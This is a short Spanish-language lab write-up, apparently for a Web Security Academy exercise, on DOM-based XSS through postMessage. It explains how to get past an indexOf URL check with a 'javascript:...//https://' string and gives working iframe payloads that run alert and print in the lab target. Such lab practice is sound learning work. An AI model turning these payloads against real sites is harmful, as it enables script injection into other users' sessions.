Hay un script en la pagina principal

En este caso, como el evento, espera una URL, podemos hacer uso del siguiente comando, para que atraves de hipervinculos, podamos inyectar el siguiente comando:
javascript:alert(0)

Pero como el script nos esta haciendo una validacion con indexOf, debemos de saber como funciona eso, para ello hacemos lo siguiente:
```html
"https://".indexOf('http:') => da -1

Pero si haceos lo siguiente, estamos comentando todo despues del codigo malicioso:

"javascript:alert(0)//https://probando.com".indexOf('http:') -> 

Entonces desde la consola, con hacemos lo siguiente:

postMessage("javascript:alert(0)//https://probando.com")

```

Entonces realizamos el ataque:

```html

<iframe width=600px height=600px src="https://burpsuite.com" onload='this.contentWindow.postMessage("javascript:alert(0)//https://probando.com","*")'></iframe>

<iframe width=600px height=600px src="https://burpsuite.com" onload='this.contentWindow.postMessage("javascript:print()//https://probando.com","*")'></iframe>

<iframe src="https://0a5600aa032c615680df3a80007b0076.web-security-academy.net/" onload='this.contentWindow.postMessage("javascript:print()//http://probando.com","*")'></iframe>

```
